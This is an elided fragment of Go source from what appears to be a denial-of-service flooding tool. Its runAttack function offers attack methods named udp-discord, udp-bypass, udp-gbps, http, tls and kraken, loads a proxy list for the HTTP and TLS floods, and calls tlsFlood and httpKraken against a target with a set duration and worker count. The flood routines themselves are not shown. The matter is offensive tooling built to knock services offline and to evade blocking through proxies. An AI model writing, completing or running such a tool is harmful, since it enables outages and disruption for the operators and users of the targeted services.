...
func runAttack() {
	...
	for {
		...
		fmt.Print(Yellow + "Choose attack method (udp-discord, udp-bypass, udp-gbps, http, tls, kraken): " + Reset)
		method, _ := reader.ReadString('\n')
		method = strings.TrimSpace(strings.ToLower(method))

		var proxies []string
		if method == "http" || method == "kraken" || method == "tls" {
			fmt.Println(Yellow + "Loading proxies from proxies.txt..." + Reset)
			rawProxies, err := loadProxies("proxies.txt")
		...
		case "tls":
			tlsFlood(target, duration, workers, workers*10)
		case "kraken":
			httpKraken(target, duration, workers, workers*10)
		default:
